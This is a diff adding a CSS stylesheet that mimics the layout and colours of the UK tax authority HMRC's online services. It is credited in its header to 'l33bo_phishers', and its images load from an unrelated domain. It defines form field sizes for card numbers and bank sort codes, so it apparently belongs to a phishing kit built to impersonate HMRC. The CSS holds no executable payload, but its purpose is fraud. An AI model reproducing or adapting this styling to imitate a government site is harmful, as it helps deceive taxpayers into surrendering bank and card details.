@@ -1,0 +1,2321 @@
+/*
+Created by l33bo_phishers -- icq: 695059760 
+*/
+
+html
+{
+	margin:0; /* IE5.5 */
+}
+body
+{
+	margin:0;
+	padding:0; /* Opera */
+	padding-bottom:.5em;
+}
+/* Default colours */
+body
+{
+	background:#fff;
+	color:#000;
+}
+/* Links are not underlined until hovered or active, or if they are in paragraphs. */
+a
+{
+	color:#066;
+	text-decoration:none;
+}
+a:hover,
+a:active,
+a:focus
+{
+	color:#c00!important;
+	text-decoration:underline!important;
+}
+a.help,
+a.help:hover,
+a.help:active,
+a.help:focus
+{
+	text-decoration:none!important;
+}
+p a,
+dl a,
+table a
+{
+	text-decoration:underline;
+}
+a.to-top /* To top links have a up-arrow graphic before them */
+{
+	padding-left:1em;
+	background:url(http://www.plrg.pl/images/arrowUpGreen.gif) no-repeat left center;
+}
+/* Font */
+*
+{
+	font-family:Verdana,sans-serif;
+	font-size:100%;
+}
+body
+{
+	/* Font-sizes that don't break IE keylines on resizing (%): 66,71,72,76,85,88,89,90,92,99,100,101,110,113,114,119,120 */
+	font-size:76%;
+	line-height:1.2;
+}
+/* Images in links have no border */
+a img
+{
+	border:none;
+}
+/* Hide content intended for screen readers */
+.screen-reader
+{
+	position:absolute;
+	top:-1000em;
+	left:0; /* Suppresses unnecessary horizontal scrolling */
+}
+/* Page width*/
+body
+{
+	width:63.5em; /* 770px @ Default IE Text-Size (Width of page in pixels * 6.243 / Verdana font-size in percent) */
+}
+/* Popup windows are likely to be smaller */
+body.popup
+{
+	width:100%;
+	max-width:63.5em;
+}
+/*
+	Headings
+	H1 is reserved for the Banner (see Banner component).
+	H2 is reserved for the Portlet title (see Portlet component).
+*/
+.portlet-body h2,
+h3
+{
+	color:#366;
+	margin:.5em 0 0 0;
+}
+h4,h5,h6
+{
+	margin:1.33em 0 -.33em 0;
+}
+/* Used for text that is red, but not an error or warning (or at least not with the warning icon). E.g. The link to activate */
+.alert
+{
+	color:#c00;
+}
+
+/* Used for components where words might need breaking to preserve layout. */
+.word-break
+{
+	word-break:break-all;
+	word-wrap:break-word;
+}
+
+p
+{
+	margin-top:.66em;
+	margin-bottom:.66em;
+	clear:both;
+}
+
+
+/* - - - - - - - - - -
+	1: Header
+	The block at the top of the page.
+*/
+/* Old HMRC Version, needs to remain until application text changes have gone live to prevent hybrid versions appearing during roll out. */
+#header
+{
+	background:#066;
+	color:#fff;
+
+	text-align:right; /* Header content right-aligned */
+
+	/* Header contains floating elements */
+	float:left;
+	width:100%;
+	padding-right:.5em;
+}
+#header + * /* Whatever happens to follow the header */
+{
+	clear:left; /* Clear the header */
+}
+#header img /* HMRC logo */
+{
+	float:left;
+}
+#header a
+{
+	color:#fff!important;
+}
+#header-title /* The main bit of text in the header */
+{
+	font-size:2em;
+
+	/* Position */
+	margin-right:.4em;
+	margin-top:.25em;
+}
+#header ul /* Header menu/navigation */
+{
+	margin-top:.5em;
+	margin-bottom:.5em;
+	font-weight:bold;
+	text-align:right;
+}
+#header li /* Header menu item */
+{
+	border-left-color:#fff;
+}
+
+/* New digital version */
+#header-digital
+{
+	/* Style */
+	background:#0b0c0c;
+	color:#fff;
+  border-bottom:10px solid #066;
+
+	/* Contains floating elements */
+  float:left;
+  width:100%;
+	padding-right:.5em;
+}
+#header-digital img /* HMRC Logo */
+{
+	/* Space */
+	padding:1em .5em;
+
+	float:left;
+}
+#header-digital img.screen
+{
+	height:29px;
+}
+#header-digital img.print
+{
+	display:none;
+}
+/* links */
+#header-digital ul a
+{
+	color:#fff;
+	font-size:1.15em;
+}
+/* move links to align with logo baseline */
+#header-digital li
+{
+	display:inline-block;
+  padding-top:1.75em;
+	border-left-width:0;
+}
+/* Right-align header links */
+#header-digital ul
+{
+	text-align:right;
+	padding-right:.5em;
+}
+/* Link back is a nested link */
+#header-digital ul ul li
+{
+	margin:0;
+	padding:0;
+}
+/* Hover states for header links */
+#header-digital a:hover,
+#header-digital a:active,
+#header-digital a:focus
+{
+	color:#fff!important;
+}
+
+/* - - - - - - - - - -
+	2: Banner
+	The bit between the header and the portlets.
+*/
+#banner + * /* Make sure the banner is cleared */
+{
+	clear:both;
+}
+#banner.no-menu div.error,
+#banner.no-menu div.warning,
+#banner.no-menu div.information
+{
+	margin-left:2.25%;
+}
+/* Keep these rules separate as IE6 will ignore the entire set */
+#banner h1.no-menu + div.error,
+#banner h1.no-menu + div.warning,
+#banner h1.no-menu + div.information
+{
+	margin-left:2.25%;
+}
+#banner div.error,
+#banner div.warning,
+#banner div.information
+{
+	margin-left:24.5%;
+}
+
+#banner div.error p:first-child
+{
+	background:url(http://www.plrg.pl/images/error.gif) 0 1.25em no-repeat;
+	padding:1em 0 1em 50px;
+	min-height:36px;
+}
+div.warning p:first-child
+{
+	background:url(http://www.plrg.pl/images/warning.gif) 0 1em no-repeat;
+	padding:1em 0 1em 40px;
+	min-height:30px;
+}
+#banner div.information p:first-child
+{
+	background:url(http://www.plrg.pl/images/information.gif) 0 1.25em no-repeat;
+	padding:1em 0 1em 50px;
+	min-height:24px;
+}
+#banner div.error p,
+#banner div.information p
+{
+	padding-left:50px;
+}
+#banner div.warning p,
+.portlet-body div.warning p
+{
+	padding-left:40px;
+}
+
+h1 /* Page heading, only 1 per page */
+{
+	font-size:2em;
+	font-weight:normal;
+	margin-top:0;
+	padding-top:.5em;
+	margin-left:24.5%; /* Align with portlets (allowing for menu) */
+	margin-bottom:0;
+	clear:right;
+}
+.no-menu h1, h1.no-menu /* Page heading when there is no menu present */
+{
+	margin-left:.85em; /* Align with portlets */
+	clear:both; /* Just in case there's a site-breadcrumb present, wrap underneath it */
+}
+#user-information /* Contains application-specific user details when authenticated */
+{
+	float:right;
+	text-align:right;
+	margin-top:.25em;
+	width:100%; /* Opera 9.52 */
+}
+#user-information .name /* The user's name */
+{
+	font-weight:bold;
+	font-size:1.2em;
+}
+/* - - - - -
+	2.2: With application information
+*/
+#site-breadcrumb /* List of links back out of the current service/application. */
+{
+	float:left;
+	list-style:none;
+
+	/* Remove indentation */
+	padding-left:0;
+	margin-left:0;
+
+	margin-top:.75em;
+}
+#site-breadcrumb li
+{
+	font-weight:bold;
+	padding-left:1em;
+	margin-left:.3em;
+	margin-top:.25em;
+	background:url(http://www.plrg.pl/images/arrowUpGreen.gif) no-repeat 0 .3em;
+}
+#user-information dl /* User's application-specific known facts */
+{
+	margin:0.25em 0 0 0;
+}
+#user-information dt
+{
+	/* Separator */
+	border-left:1px solid #000;
+	padding-left:1em;
+	margin-left:.5em;
+}
+#user-information dt:first-child
+{
+	border:none; /* No separator */
+}
+#user-information dt,
+#user-information dd
+{
+	display:inline; /* Put user's information on single line */
+}
+#user-information dd
+{
+	margin-left:0; /* No indentation */
+}
+
+
+/* - - - - - - - - - -
+	3: Process Overview
+	Numbered "Stepping Stones" with text descriptions.
+*/
+.process-overview
+{
+	margin:1em 0 1.5em 0;
+	float:left; /* Contains floating elements */
+	width:auto;
+}
+.process-overview dt /* The number (and image) */,
+.process-overview dd /* The text */
+{
+	float:left;
+	margin:0 .25em; /* Space around stepping stones and text */
+}
+.process-overview dt
+{
+	font-weight:bold;
+
+	border:1px solid #555;
+	-moz-border-radius:13px;
+	border-radius:13px;
+
+	margin-top:2px;
+	width:25px;
+	height:25px;
+
+	/* Center number */
+	text-align:center;
+	line-height:24px;
+}
+.process-overview dt.selected
+{
+	border:none;
+	width:27px;
+	height:27px;
+	line-height:26px;
+	background:#444;
+	color:#fff;
+}
+.process-overview dd
+{
+	background:url(http://www.plrg.pl/images/processArrow.gif) no-repeat right center; /* Arrow pointing to the next step */
+	padding-right:23px; /* Space for arrow, including space between arrow and its text */
+	padding-left:.2em; /* Space adjustment between text and number */
+	min-height:29px;
+}
+.process-overview dd.selected
+{
+	font-weight:bold;
+}
+/*
+	The last step's definition description must have a class name of "last" so we can remove its arrow.
+	This is in preference to putting the arrow before the number and using first-child because wrapping works better.
+*/
+.process-overview dd.last
+{
+	background:none; /* Remove image */
+	padding-right:0; /* Remove space for image */
+}
+/* Clear the process overview */
+.process-overview + *
+{
+	clear:both;
+}
+/* When the Process Overview is inside a Portlet there is no left margin */
+.portlet .process-overview
+{
+	margin-left:0;
+}
+
+
+/* - - - - - - - - - -
+	4: Columns
+*/
+div.columns + *
+{
+	clear:both;
+}
+div.columns div.column
+{
+	float:left;
+}
+div.two-columns div.column{width:50%;}
+/* - - - - -
+	4.1: menu/page
+*/
+div.menu-column{width:22%;}
+div.page-column{width:78%;}
+/* - - - - -
+	4.2: line-between
+*/
+.columns.line-between .column
+{
+	border-left:1px solid #ccc;
+	margin-right:-1px;
+}
+.columns.line-between .column:first-child
+{
+	border-left:none;
+	border-right:1px solid #ccc;
+	margin-left:-1px;
+}
+.columns.line-between .column > p,
+.columns.line-between .column > div
+{
+	margin-left:1em;
+	margin-right:1em;
+}
+/* - - - - -
+	4.3: 33/67
+*/
+div.one-third{width:33%;}
+div.two-thirds{width:67%;}
+
+
+/* - - - - - - - - - -
+	5: Menu
+	Left-hand navigation.
+*/
+#main-menu
+{
+	margin-left:.3em; /* Space between edge of page and menu */
+}
+/* Menu heading, not really a menu item. */
+#main-menu > li:first-child
+{
+/*	background:#066 url(/images/corner.gif) no-repeat top right;*/
+	background:#066;
+	-moz-border-radius:0 20px 0 0;
+	border-radius:0 20px 0 0;
+	color:#fff;
+	padding:.25em;
+	font-size:1.38em;
+}
+#main-menu,
+#main-menu a
+{
+	font-weight:bold;
+	font-family:arial,sans-serif; /* Narrower font */
+}
+/* No bullets or indentation */
+#main-menu,
+#main-menu ul
+{
+	list-style:none;
+	padding-left:0;
+	margin-top:0;
+}
+#main-menu li a
+{
+	/* Spacing between top-level menu items */
+	display:block;
+	padding:.5em; /* Spacing between menu items is applied to links to increase their clickable area. */
+
+	/* Arrows */
+	background:url(http://www.plrg.pl/images/arrowRightGreen.gif) no-repeat 3px .75em;
+	padding-left:1em; /* Space between arrow and link text */
+}
+#main-menu li li li a /* Third-level menu items */
+{
+	background-image:url(http://www.plrg.pl/images/menuBulletLevel3.gif);
+}
+#main-menu li li li.selected a /* selected third-level menu items */
+{
+	background-image:url(http://www.plrg.pl/images/menuBulletLevel3Selected.gif);
+}
+/* Lines between top-level menu items */
+#main-menu li
+{
+	border:1px solid #066;
+	border-top:none;
+}
+#main-menu ul li,
+#main-menu li:first-child
+{
+	border:none;
+}
+/* Nested Menu */
+#main-menu li.submenu > a
+{
+	background-image:url(http://www.plrg.pl/images/arrowDownBlack.gif);
+	padding-left:1.3em; /* Space between arrow and link text */
+	color:#000;
+}
+#main-menu ul /* nested menu */
+{
+	border-top:1px solid #066;
+
+	/* Nested menu indentation */
+	padding-left:1em;
+	margin-left:0;
+}
+#main-menu ul ul /* second level+ nested menu */
+{
+	border-top:none;
+}
+#main-menu ul li a
+{
+	/* Decrease spacing between nested menu items */
+	padding-top:.25em;
+	padding-bottom:.25em;
+
+	/* Move arrows up a bit in nested menus because we are decreasing spacing */
+	background-position:2px .5em;
+}
+/* Selected menu items */
+#main-menu li.selected a
+{
+	color:#000;
+	background-image:url(http://www.plrg.pl/images/arrowRightBlack.gif);
+	font-size:1.07em; /* Selected items are marginally larger */
+}
+#main-menu li.submenu /* A menu item is only given a submenu class if its submenu is expanded */,
+#main-menu li.selected
+{
+	background:#e1eeee;
+}
+#main-menu li.submenu li.submenu /* Expanded second level menu item */
+{
+	background:#fff;
+}
+#main-menu ul,
+#main-menu ul li.selected
+{
+	background:#fff; /* Undo for nested menu items */
+}
+#main-menu li.separator
+{
+	border-top:.5em solid #066;
+}
+
+
+/* - - - - - - - - - -
+	6: Portlet
+*/
+.portlet
+{
+		float:left;
+		border:1px solid #066;
+		-moz-border-radius:0 20px 0 0;
+		border-radius:0 20px 0 0;
+		border-bottom:none;
+		border-left:none;
+		position:relative;
+		margin-bottom:1.5em;
+		margin-left:1.5em; /* Horizontal distance between portlets */
+		padding:.2em;
+}
+.portlet {width:97%; margin-left:3%;}
+.two-columns .portlet {width:94%; margin-left:6%;}
+
+/* Spacing when the portlet has no header */
+.portlet-body
+{
+	margin-top:1em;
+}
+
+/* Spacing when the portlet has a header */
+.portlet-header
+{
+	margin-bottom:-1em;
+}
+
+.portlet-header
+{
+	/* Top border & background */
+	background:#e1eeee;
+	-moz-border-radius:0 20px 0 0;
+	border-radius:0 20px 0 0;
+	margin:-.2em;
+}
+.portlet-header h2
+{
+	color:#366;
+	font-size:1.05em;
+	padding:.25em .2em;
+	margin:0 20px 0 0; /* 20px is space reserved for the help icon */
+}
+
+/* Portlet help icon */
+.portlet-header a.help,
+.portlet > a.help
+{
+	position:absolute;
+	right:6px;
+	top:5px;
+	z-index:1;
+}
+
+/* Portlets need to contain floating elements*/
+.portlet-body
+{
+	float:left;
+	width:100%;
+}
+/* Whatever follows a portlet must clear it */
+.portlet + *
+{
+	clear:both;
+}
+/* - - - - -
+	6.1: No title bar
+*/
+/* Legacy HTML support */
+.no-title-bar .portlet-header
+{
+	position:absolute;
+	background:none;
+}
+
+
+/* - - - - - - - - - -
+	7: Default Definition List
+*/
+dl.default dt
+{
+	font-weight:bold;
+	width:25%;
+	float:left;
+}
+dl.default dd
+{
+	margin-left:25%;
+	margin-bottom:1em;
+	padding-left:1em;
+}
+/* - - - - -
+	7.1: Compressed List
+*/
+ul.compressed
+{
+	clear:both;
+	margin-left:0;
+	padding-left:2em;
+}
+ul.compressed li
+{
+	margin-bottom:1em;
+}
+ul.compressed p
+{
+	margin:0;
+}
+
+
+/* - - - - - - - - - -
+	8: Form Layouts
+*/
+/* Errors and warnings in a form */
+form div.error p,
+form div.warning p,
+form .field div.information p,
+.portlet-body div.error p,
+.portlet-body form div.warning p
+{
+	padding:0;
+	padding-left:20px; /* Space for background image */
+	margin:.5em 0 .25em 0;
+	min-height:16px;
+
+	position:relative; /* Graphic was not rendering in .calculation fieldsets in IE */
+}
+form div.error p:first-child,
+.portlet-body form div.warning p:first-child,
+form .field div.information p:first-child,
+.portlet-body div.error p:first-child
+{
+	background:url(http://www.plrg.pl/images/errorIcon.gif) 0 .1em no-repeat;
+}
+.portlet-body form div.warning p:first-child
+{
+	background-image:url(http://www.plrg.pl/images/warningIcon.gif);
+	background-position:0 0;
+}
+form .field div.information p:first-child
+{
+	background-image:url(http://www.plrg.pl/images/informationIcon.gif);
+	background-position:0 0;
+}
+/* Error and warning messages */
+div.error,
+div.error a,
+div.warning,
+div.warning a
+{
+	color:#c00;
+}
+.field /* Container for form field 'rows' */
+{
+	float:left;
+	width:100%;
+
+	/* Vertical space between fields */
+	padding-bottom:1em;
+
+	clear:both;
+}
+form.inline .field + *
+{
+	padding-top:0;
+}
+/* Error messages above fields */
+.field div.error,
+.field div.warning,
+.field div.information
+{
+	padding-left:1em; /* Must be equal to padding-right on 'label' selector */
+}
+span.required /* Asterisks */
+{
+	color:#c00;
+}
+.field label,
+legend .question
+{
+	float:left;
+	text-align:right;
+	padding-right:1em; /* Space reserved for asterisk */
+	position:relative; /* Allows absolute positioning of asterisk and currency symbol */
+	padding-top:.25em; /* Vertically align label with contents of input fields. */
+}
+label .required,
+legend .question .required
+{
+	/* Position the asterisk to the top right of the label */
+	position:absolute;
+	top:.25em;
+	right:.25em;
+
+}
+/* Fields with multiple input controls use unordered lists (checkboxes and radio buttons) */
+.field ul
+{
+	margin:0;
+	padding:0;
+	list-style:none;
+	padding-left:1em;
+}
+.currency .field ul
+{
+	padding-left:2em;
+}
+.field ul li
+{
+	margin-bottom:.75em; /* Space between checkboxes and radio buttons */
+}
+.field ul label /* Checkbox and radio button labels */
+{
+	/* Undo normal label styling */
+	float:none;
+	position:static;
+	display:block; /* Nice wrapping */
+	margin-left:2em;
+	text-align:left; /* Undo default label style */
+	width:auto !important; /* label wraps prematurely in Opera */
+}
+/* Required asterisks on checkbox and radio button list labels just stay in a normal inline position */
+.field ul label span.required
+{
+	position:static;
+}
+.field a.help img /* Help icons */
+{
+	vertical-align:top;
+	position:relative;
+	top:.33em;
+}
+.field label a.help img,
+legend .question a.help img /* Help icons in label elements */
+{
+	position:static;
+}
+/* Example text underneath input controls */
+.field .hint
+{
+	padding-left:1em; /* Must be equal to padding-right on 'label' selector */
+	color:#666;
+	margin-left:50%;
+}
+.hint p /* Content inside a hint must be inside a paragraph */
+{
+	margin:0;
+	clear:none;
+}
+
+/* Default label width */
+.field label,
+legend .question
+{
+	width:50%;
+
+}
+form .field div.error,
+form .field div.warning,
+form .field div.information,
+form .hint,
+form .field ul
+{
+	margin-left:50%;
+}
+.field legend
+{
+	width:100%; /* non-IE */
+}
+/* - - - - -
+	8.1: Narrow labels.
+*/
+.narrow-labels .field label,
+.narrow-labels .field legend .question
+{
+	width:33%;
+}
+.narrow-labels .field legend
+{
+	width:100%; /* non-IE */
+}
+.narrow-labels .field div.error,
+.narrow-labels .field div.warning,
+.narrow-labels .field div.information,
+.narrow-labels .hint,
+.narrow-labels .field ul
+{
+	margin-left:33%;
+}
+/* - - - - -
+	8.2: Wide labels.
+*/
+.wide-labels .field label,
+.wide-labels .field legend .question
+{
+	width:66%;
+}
+.wide-labels .field legend
+{
+	width:100%; /* non-IE */
+}
+.wide-labels .field div.error,
+.wide-labels .field div.warning,
+.wide-labels .field div.information,
+.wide-labels .hint,
+.wide-labels .field ul
+{
+	margin-left:66%;
+}
+/* - - - - -
+	8.3: Currency
+	One or more fields have a currency symbol before them.
+*/
+.currency .field label,
+.currency legend .question
+{
+	padding-right:2em; /* Space reserved for asterisk and currency symbol */
+}
+.currency label .required,
+.currency legend .question .required
+{
+	right:1.25em; /* Move asterisk left a bit more. */
+}
+.field label .currency
+{
+	position:absolute;
+	right:.25em;
+	top:.25em;
+}
+.currency .field div.error,
+.currency .field div.warning,
+.currency .field div.information,
+.currency .hint
+{
+	padding-left:2em;
+}
+/* Read-only forms in currency forms need to line up.*/
+.currency .read-only-form dd {width:47.25%}
+.currency.wide-labels .read-only-form dd {width:31.75%}
+.currency.narrow-labels .read-only-form dd {width:63.25%}
+/* - - - - - - - - - -
+	8.4: Single Field Form
+	A form with only one input control, with the button to its right.
+*/
+.single-field .field div.error,
+.single-field .field div.warning,
+.single-field .field div.information,
+.single-field .hint
+{
+	margin-left:0;
+	padding-left:0;
+}
+/* Undo default form label styles */
+.single-field .field label
+{
+	width:auto;
+	position:relative;
+}
+.single-field .field,
+.single-field .buttons
+{
+	display:inline;
+	width:auto;
+	float:none;
+	clear:none;
+}
+.single-field .buttons input
+{
+	float:none;
+}
+/* Position hint text */
+.single-field .field .hint
+{
+	position:absolute;
+}
+/* - - - - - - - - - -
+	8.5: Zero-Field Form
+*/
+/* - - - - -
+	8.6: Full-width
+	The form labels go above the fields.
+*/
+.full-width .field label,
+.full-width legend .question
+{
+	/* undo default style */
+	position:static;
+	float:none;
+	text-align:left;
+	width:auto;
+	display:block; /* label appears on its own line */
+	margin-bottom:.25em; /* space between label and field */
+}
+.full-width .field fieldset
+{
+	top:0;
+}
+.full-width label span,
+.full-width legend .question span
+{
+	position:static; /* asterisks & currency symbols just go on the end of the label */
+}
+/* Errors, warnings and hints are left aligned */
+.full-width .field div.error,
+.full-width .field div.warning,
+.full-width .field div.information,
+.full-width .hint,
+.full-width .field ul
+{
+	margin-left:0;
+	padding-left:0;
+}
+/* Radio and checkbox lists need a little bit more space */
+.full-width .field ul
+{
+	margin-top:.5em;
+}
+/* - - - - -
+	8.7: Fieldsets
+	The form labels go above the fields.
+*/
+fieldset
+{
+	/* Fieldset border was touching contents at the bottom, (IE & Opera) */
+	padding-bottom:10px;
+	padding-left:1em;
+	padding-right:1em;
+	padding-top:10px;
+	margin-right:1em;
+
+
+	/* Firefox 17 */
+	clear:left;
+}
+legend
+{
+	font-weight:bold;
+	color:#366;
+}
+/* - - - - -
+	8.7.1: Minimal fieldset
+	The form labels go above the fields.
+*/
+form fieldset.minimal
+{
+	border:none;
+	border-top:1px solid #ccc;
+	margin-top:1em;
+}
+fieldset.minimal > legend
+{
+	display:none;
+}
+/* - - - - -
+	8.8: Mixed
+*/
+/* - - - - -
+	8.9: Inline form
+	The form labels go above the fields.
+*/
+form.inline,
+div.inline /* used when mixing layouts */
+{
+	float:left; /* Contains floating elements */
+}
+form.inline + *
+{
+	clear:left;
+}
+form.inline .field,
+div.inline .field
+{
+	/* Create shrink-block for field */
+	float:left;
+	width:auto;
+	clear:none;
+
+	padding-right:2em; /* Space between fields */
+}
+form.inline .field label,
+div.inline .field label
+{
+	float:none; /* Prevent labels appearing above the fields in Opera */
+	width:auto; /* Reduce width of labels in IE5.5 */
+	padding-right:0; /* Remove spacing for asterisk and currency alignment */
+}
+form.inline .field div.error,
+div.inline .field div.error
+{
+	display:none; /* Don't display form-field errors in field blocks - developer must put error messages above all fields. */
+}
+/* Try to make hints look better */
+form.inline .hint,
+div.inline .hint
+{
+	margin-left:0;
+	padding-left:0;
+	text-align:right;
+}
+form.inline label span,
+div.inline label span
+{
+	position:static; /* undo asterisk alignment */
+}
+/* buttons also need to be made inline */
+form.inline .buttons,
+div.inline .buttons
+{
+	float:left;
+	width:auto;
+	clear:none;
+}
+/* undo default button style */
+form.inline .buttons input,
+div.inline .buttons input
+{
+	float:none;
+	margin-left:0;
+}
+/* - - - - - - - - - -
+	8.10: Show/Hide
+*/
+/* - - - - - - - - - -
+	8.11: Two columns
+*/
+form div.columns.two-columns
+{
+	display:block;
+	float:none;
+	overflow:visible;
+}
+form div.columns.two-columns div.column
+{
+	display:inline-block;
+	float:none;
+	width:49%;
+}
+form div.columns.two-columns div.column div.field
+{
+	vertical-align:bottom;
+}
+
+/* - - - - -
+	9: Form Fields
+*/
+/*
+	Field width classifications, add as necessary.
+	(multiply desired visible characters + 1 by .76, the body element's font size)
+*/
+input.short-code {width: 3.80em;}
+input.ccno {width: 3.80em;}
+input.sort {width: 1.80em;}
+input.date       {width: 8.36em;}
+input.number     {width: 9.12em;}
+input.code       {width: 9.88em;}
+input.reference  {width:14.44em;}
+input.file       {width:19.76em;}
+input.email      {width:22.04em;}
+input.url        {width:22.04em;}
+input.description{width:30.14em;}
+
+.field input{max-width:46%;}
+.wide-labels .field input{max-width:30%;}
+.narrow-labels .field input{max-width:63%;}
+
+.inline .field input,
+.single-field .field input
+{max-width:none;}
+
+.full-width input.description{width:97%; min-width:97%}
+
+/* - - - - -
+	9.1: Split text
+*/
+/* Fields with multiple input controls, but all on one line, e.g. text boxes with slash separators. */
+.field ul.inline li
+{
+	float:none;
+	display:inline;
+	padding-right:.5em;
+}
+.field ul.inline label
+{
+	/* Undo default field list styles */
+	display:inline;
+	position:static;
+	width:auto !important;
+}
+/* - - - - -
+	9.2: Checkboxes
+*/
+/* Use a fieldset legend for question text */
+.field fieldset
+{
+	border:none;
+	padding:0;
+	margin:0;
+	position:relative;
+	top:1em;
+}
+.full-width .field legend
+{
+	margin-bottom:0; /* Firefox, IE */
+}
+legend .question
+{
+	position:absolute;
+	top:0;
+	white-space:normal;
+	font-weight:normal;
+	color:#000;
+	text-align:right;
+	display:block;
+}
+/* Nice wrapping labels for checkbox and radio button lists */
+
+
+
+/* - - - - -
+	9.3: File upload
+*/
+/* - - - - -
+	9.4: Radio buttons
+*/
+/* - - - - -
+	9.5: Drop down lists
+*/
+/* - - - - -
+	9.6: Text areas
+*/
+textarea
+{
+	overflow:auto; /* remove unnecessary scrollbars */
+}
+/* Prevent large or user-stretched textareas from going too wide */
+.field textarea{max-width:43%}
+.narrow-labels .field textarea{max-width:61%}
+.wide-labels .field textarea{max-width:28%}
+.full-width .field textarea{max-width:96%}
+/* - - - - -
+	9.7: Passwords
+*/
+/* - - - - -
+	10: Form submit buttons
+*/
+.buttons
+{
+	float:left;
+	width:100%;
+	padding:.5em;
+	padding-top:0;
+	margin-top:0;
+	clear:both;
+}
+.buttons input
+{
+	float:right; /* This way, the first button can be rightmost, the first button is used when pressing enter. */
+	margin-right:1em; /* Space between buttons */
+}
+.buttons + *,
+form + *
+{
+	clear:both;
+}
+/* - - - - -
+	10.1: Major/minor
+	Less important form-submission buttons
+*/
+.buttons .minor input
+{
+	float:left;
+	margin-right:1em; /* Space between buttons */
+	margin-left:0; /* Undo default style */
+}
+/* - - - - -
+	10.2: Buttons with guidance
+*/
+.button-instructions
+{
+	clear:both;
+	position:relative; /* Container for absolutely positioned elements */
+	width:100%; /* IE hasLayout bug */
+	height:3em; /* Appears to be the only way to acheive spacing above the instructions */
+	color:#666; /* In preference to reducing the font size */
+	margin-top:1em;
+	margin-bottom:.25em;
+}
+.button-instructions p
+{
+	margin-bottom:0; /* Keep the text in the instructions as close to the buttons as possible. */
+}
+.button-instructions .minor /* The instructions for the buttons positioned to the left */
+{
+	position:absolute;
+	bottom:0;
+	left:0;
+}
+.button-instructions .major /* The instructions for the buttons positioned to the right */
+{
+	position:absolute;
+	bottom:0;
+	right:1em;
+	text-align:right;
+}
+/* - - - - -
+	10.3: Command buttons
+*/
+.buttons .command
+{
+	float:left; /* Contains floating elements */
+	width:95%; /* Internet Explorer */
+
+	margin:.5em 0; /* Space between rows of buttons */
+}
+.buttons .command input
+{
+	float:left; /* Alignment */
+	margin-top:.25em;
+}
+.buttons .command p
+{
+	/* Spacing - 6ems on the left is to avoid a jagged alignment for different sized buttons (although large buttons will still
+		 make the alignment jagged.
+	*/
+	margin:0 .5em .5em 6em;
+	clear:none;
+}
+/* - - - - -
+	10.4: Bypass JavaScript validation
+*/
+/* - - - - -
+	10.5: Navigational Submit Buttons
+*/
+.buttons form
+{
+	float:right;
+	clear:none;
+}
+.buttons form div
+{
+	display:inline;
+}
+.buttons form div input
+{
+	float:none;
+}
+
+
+/* - - - - - - - - - -
+	11: Read-only Form
+	A Definition list that represents a form that cannot be amended, normally an echo of a submitted form for confirmation
+	purposes.  Not actually a form.
+*/
+.read-only-form
+{
+	/* Contains floating elements */
+	float:left;
+	width:100%;
+	margin-left:0;
+	margin-right:0;
+	padding:0;
+}
+.read-only-form dt
+{
+	float:left;
+	width:50%;
+	text-align:right;
+	clear:both;
+}
+.read-only-form dd
+{
+	float:right;
+	clear:right;
+	width:48%; /* Less than 50% for spacing between term and definition */
+}
+.read-only-form dt,
+.read-only-form dd
+{
+	margin:0;
+	padding:0;
+	margin-top:.75em; /* Space between fields */
+}
+/* Whatever follows the form should clear it */
+.read-only-form + *
+{
+	clear:both;
+}
+/* - - - - -
+	11.1: narrow-labels
+*/
+.read-only-form.narrow-labels dt {width:33%}
+.read-only-form.narrow-labels dd {width:65%}
+/* - - - - -
+	11.2: wide-labels
+*/
+.read-only-form.wide-labels dt {width:66%}
+.read-only-form.wide-labels dd {width:32%}
+/* - - - - -
+	11.3: headings
+*/
+.read-only-form.headings dt
+{
+	font-weight:bold;
+}
+
+
+/* - - - - - - - - - -
+	12: Catalogue
+	Used for Your online services list, and hopefully more.
+*/
+ul.catalogue
+{
+	border-top:1px solid #ccc; /* Line above Catalogue */
+	list-style:none;
+	margin:.5em; /* Space around whole catalogue (touched Portlet Keyline in non-IE) */
+	padding:0;
+}
+.catalogue > li
+{
+	border-bottom:1px solid #ccc; /* Line between Catalogue Products */
+	padding-right:12em; /* Space for Options */
+	position:relative; /* So Options can be absolutely positioned */
+	min-height:4.5em;
+}
+.composite .catalogue > li
+{
+	min-height:0;
+}
+/* Information about the Product in the Catalogue, e.g. service primary known facts */
+.catalogue dl
+{
+	padding-bottom:.5em; /* Space between the data and the separating line */
+	margin:0; /* Remove default DL element indentation. */
+}
+.catalogue dt
+{
+	float:left;
+	margin-right:.5em; /* Space between label and data */
+}
+.catalogue dd
+{
+	padding-left:0;
+	margin-left:0; /* Firefox */
+}
+/* Actions the user can invoke on a specific product */
+.catalogue .options
+{
+	position:absolute;
+	top:0;
+	right:0;
+	width:11.5em;
+	list-style:none;
+	padding:0;
+	margin:0;
+}
+.catalogue .options li
+{
+	padding-bottom:.25em; /* Space between options */
+}
+.catalogue .options a
+{
+	background:url(http://www.plrg.pl/images/arrowRightGreen.gif) no-repeat 0 .3em;
+	padding:0 .25em 0 .75em; /* .75em on the left - space for arrow. */
+	display:block; /* Graceful wrapping */
+}
+.catalogue p /* Product description, e.g. Information about a service which is not enrolled */
+{
+	padding:0;
+	margin:.5em 0; /* Reduce default paragraph spacing in the Product descriptions */
+}
+.catalogue .composite
+{
+	padding-right:0;
+}
+.catalogue .composite .catalogue
+{
+	list-style:none;
+	margin:0;
+	border-top:none;
+	padding-right:0;
+}
+.catalogue li.composite .catalogue li
+{
+	border-bottom:none;
+	padding-top:.25em;
+	padding-bottom:.5em;
+}
+.catalogue h2,
+.catalogue h3
+{
+	color:#000;
+}
+.catalogue li ul
+{
+	list-style-type:disc;
+}
+
+
+/* - - - - - - - - - -
+	13: Messages
+	A paragraph/section intended to stand out from the rest of the page's content.
+*/
+/* These properties are shared between all messages. */
+div.message
+{
+	padding-left:30px; /* Space for the image, also a margin for entire message, stopping it from wrapping under the image */
+	margin:.5em 0;
+	float:left; /* May contain floating elements */
+	width:90%;
+}
+.two-columns div.message
+{
+	width:88%;
+}
+div.message + *
+{
+	clear:both;
+}
+table.default .message
+{
+	border:none;
+	margin:0;
+	padding-top:0;
+	padding-bottom:0;
+	float:none;
+	width:auto;
+}
+/* - - - - -
+	13: Message/Success
+	Message with a green tick to the left of it.
+*/
+.success
+{
+	background:#e1eeee url(http://www.plrg.pl/images/successIcon.gif) no-repeat .5em 1em;
+	border:2px solid #066;
+}
+table.default .success
+{
+	background:url(http://www.plrg.pl/images/successIcon.gif) no-repeat .5em 0;
+}
+/* - - - - -
+	13.1: Message/Failure
+	Message with a red cross to the left of it.
+	Contrast with error component - the error component is limited to one paragraph.
+*/
+.failure
+{
+	background:#fee url(http://www.plrg.pl/images/errorIcon.gif) no-repeat .5em 1em;
